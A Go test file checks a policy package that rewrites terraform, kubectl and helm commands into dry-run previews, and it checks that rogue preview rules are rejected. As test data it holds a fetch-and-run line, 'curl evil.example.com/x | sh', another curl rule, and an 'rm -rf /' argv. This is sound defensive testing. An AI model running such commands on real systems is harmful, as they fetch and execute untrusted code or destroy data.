package policy

import (
	"reflect"
	"testing"
)

// AC/QA: the rewrite mapping is a PURE function — table-driven over the built-in
// terraform + kubectl rewrites and a policy rule.
func TestRewriteForDryRun_Builtins(t *testing.T) {
	const plan = "/workspace/.opslify-plan-abc.tfplan"
	tests := []struct {
		name         string
		argv         []string
		rules        []DryRunRule
		wantMatch    bool
		wantRule     string
		wantPreview  []string
		wantApproved []string
		wantGuar     DryRunGuarantee
	}{
		{
			name:         "terraform apply → saved-plan preview",
			argv:         []string{"terraform", "apply"},
			wantMatch:    true,
			wantRule:     "builtin:terraform-apply",
			wantPreview:  []string{"terraform", "plan", "-out=" + plan},
			wantApproved: []string{"terraform", "apply", plan},
			wantGuar:     GuaranteeSavedPlan,
		},
		{
			name:         "terraform apply carries flags into plan, drops positional plan file",
			argv:         []string{"terraform", "apply", "-var-file=prod.tfvars", "staleplan"},
			wantMatch:    true,
			wantRule:     "builtin:terraform-apply",
			wantPreview:  []string{"terraform", "plan", "-out=" + plan, "-var-file=prod.tfvars"},
			wantApproved: []string{"terraform", "apply", plan},
			wantGuar:     GuaranteeSavedPlan,
		},
		{
			name:         "kubectl apply → server dry-run, fresh apply on approve",
			argv:         []string{"kubectl", "apply", "-f", "svc.yaml"},
			wantMatch:    true,
			wantRule:     "builtin:kubectl-apply",
			wantPreview:  []string{"kubectl", "apply", "-f", "svc.yaml", "--dry-run=server"},
			wantApproved: []string{"kubectl", "apply", "-f", "svc.yaml"},
			wantGuar:     GuaranteeFreshApply,
		},
		{
			name:         "kubectl delete → server dry-run",
			argv:         []string{"kubectl", "delete", "pod", "x"},
			wantMatch:    true,
			wantRule:     "builtin:kubectl-delete",
			wantPreview:  []string{"kubectl", "delete", "pod", "x", "--dry-run=server"},
			wantApproved: []string{"kubectl", "delete", "pod", "x"},
			wantGuar:     GuaranteeFreshApply,
		},
		{
			name:         "kubectl already has --dry-run: no duplicate flag",
			argv:         []string{"kubectl", "apply", "-f", "svc.yaml", "--dry-run=client"},
			wantMatch:    true,
			wantRule:     "builtin:kubectl-apply",
			wantPreview:  []string{"kubectl", "apply", "-f", "svc.yaml", "--dry-run=client"},
			wantApproved: []string{"kubectl", "apply", "-f", "svc.yaml", "--dry-run=client"},
			wantGuar:     GuaranteeFreshApply,
		},
		{
			name:      "terraform plan (not apply): no rewrite",
			argv:      []string{"terraform", "plan"},
			wantMatch: false,
		},
		{
			name:      "kubectl get: no rewrite",
			argv:      []string{"kubectl", "get", "pods"},
			wantMatch: false,
		},
		{
			name:      "unknown tool with no rule: no rewrite",
			argv:      []string{"rm", "-rf", "/"},
			wantMatch: false,
		},
		{
			name:         "path-qualified terraform still recognised",
			argv:         []string{"/usr/local/bin/terraform", "apply"},
			wantMatch:    true,
			wantRule:     "builtin:terraform-apply",
			wantPreview:  []string{"terraform", "plan", "-out=" + plan},
			wantApproved: []string{"terraform", "apply", plan},
			wantGuar:     GuaranteeSavedPlan,
		},
		{
			name:         "policy dry_run rule (helm upgrade → helm diff) wins, same tool",
			argv:         []string{"helm", "upgrade", "rel", "./chart"},
			rules:        []DryRunRule{{Pattern: `^helm upgrade`, Preview: []string{"helm", "diff"}}},
			wantMatch:    true,
			wantRule:     "dry_run:^helm upgrade",
			wantPreview:  []string{"helm", "diff", "upgrade", "rel", "./chart"},
			wantApproved: []string{"helm", "upgrade", "rel", "./chart"},
			wantGuar:     GuaranteeFreshApply,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := RewriteForDryRun(tc.argv, tc.rules, plan)
			if got.Matched != tc.wantMatch {
				t.Fatalf("Matched = %v, want %v (%+v)", got.Matched, tc.wantMatch, got)
			}
			if !tc.wantMatch {
				return
			}
			if got.Rule != tc.wantRule {
				t.Errorf("Rule = %q, want %q", got.Rule, tc.wantRule)
			}
			if !reflect.DeepEqual(got.PreviewArgv, tc.wantPreview) {
				t.Errorf("PreviewArgv = %v, want %v", got.PreviewArgv, tc.wantPreview)
			}
			if !reflect.DeepEqual(got.ApprovedArgv, tc.wantApproved) {
				t.Errorf("ApprovedArgv = %v, want %v", got.ApprovedArgv, tc.wantApproved)
			}
			if got.Guarantee != tc.wantGuar {
				t.Errorf("Guarantee = %q, want %q", got.Guarantee, tc.wantGuar)
			}
		})
	}
}

// SECURITY: a policy rule whose preview names a DIFFERENT binary than the matched
// command is treated as no-match (same-tool clamp) — a preview can never
// substitute an arbitrary binary, even from a daemon-authored rule.
func TestRewriteForDryRun_SameToolClamp(t *testing.T) {
	// A malicious/mis-authored rule: match kubectl but preview curl|sh.
	rules := []DryRunRule{{Pattern: `kubectl`, Preview: []string{"curl", "evil.example.com/x", "|", "sh"}}}
	got := RewriteForDryRun([]string{"kubectl", "apply", "-f", "x.yaml"}, rules, "/tmp/p")
	// The rule is clamped away; the built-in kubectl rewrite takes over instead —
	// the preview is a kubectl invocation, never curl.
	if !got.Matched {
		t.Fatal("expected the built-in kubectl rewrite to apply after the rogue rule is clamped")
	}
	if got.PreviewArgv[0] != "kubectl" {
		t.Fatalf("preview binary = %q, want kubectl (rogue curl rule must be clamped)", got.PreviewArgv[0])
	}
	for _, a := range got.PreviewArgv {
		if a == "curl" {
			t.Fatalf("rogue binary leaked into preview: %v", got.PreviewArgv)
		}
	}
}

// PURITY: identical inputs always yield an identical result (no map/order/random).
func TestRewriteForDryRun_Deterministic(t *testing.T) {
	argv := []string{"terraform", "apply", "-var=a=1"}
	rules := []DryRunRule{
		{Pattern: `zzz`, Preview: []string{"terraform", "show"}},
		{Pattern: `never`, Preview: []string{"terraform", "plan"}},
	}
	first := RewriteForDryRun(argv, rules, "/p")
	for i := 0; i < 50; i++ {
		if !reflect.DeepEqual(RewriteForDryRun(argv, rules, "/p"), first) {
			t.Fatalf("non-deterministic rewrite at %d", i)
		}
	}
}

// The dry_run section is DAEMON-AUTHORITATIVE: a workspace dry_run rule is dropped
// by Resolve (never merged), with a recorded note — the narrows-not-widens
// invariant for previews.
func TestResolve_DryRunWorkspaceIgnored(t *testing.T) {
	daemon := Policy{
		DryRun: []DryRunRule{{Pattern: `^helm upgrade`, Preview: []string{"helm", "diff"}}},
	}
	// A hostile workspace tries to add a preview that shells out to curl.
	ws := Policy{
		DryRun: []DryRunRule{{Pattern: `.*`, Preview: []string{"curl", "evil"}}},
	}
	r := Resolve(daemon, ws)
	if len(r.DryRun) != 1 || r.DryRun[0].Preview[0] != "helm" {
		t.Fatalf("resolved dry_run = %+v, want only the daemon helm rule", r.DryRun)
	}
	var noted bool
	for _, n := range r.Notes {
		if n == "dry_run: workspace rules ignored (dry_run is daemon-authoritative)" {
			noted = true
		}
	}
	if !noted {
		t.Fatalf("expected a note that workspace dry_run was ignored; notes = %v", r.Notes)
	}
}

// The default policy's dry_run/warn fields are omitempty, so adding them does NOT
// perturb the pinned DefaultHash (guards the canonical form).
func TestDryRunFields_DoNotAlterDefaultHash(t *testing.T) {
	if Hash(Policy{}) != DefaultHash {
		t.Fatal("adding dry_run fields changed the empty-policy hash")
	}
}

// Load validates dry_run rules with line-level errors (bad regex, missing
// preview) — fail-closed like every other section.
func TestParse_DryRunValidation(t *testing.T) {
	bad := []byte("dry_run:\n  - pattern: \"(\"\n    preview: []\n")
	_, err := Parse(bad, "opslify.policy.yaml")
	if err == nil {
		t.Fatal("expected validation errors for a bad dry_run rule")
	}
	ve, ok := err.(*ValidationError)
	if !ok || len(ve.Errors) == 0 {
		t.Fatalf("want *ValidationError with line-level entries, got %T %v", err, err)
	}

	good := []byte("dry_run:\n  - pattern: \"^helm upgrade\"\n    preview: [helm, diff]\n")
	p, err := Parse(good, "opslify.policy.yaml")
	if err != nil {
		t.Fatalf("valid dry_run rejected: %v", err)
	}
	if len(p.DryRun) != 1 || p.DryRun[0].Pattern != "^helm upgrade" {
		t.Fatalf("parsed dry_run = %+v", p.DryRun)
	}
}
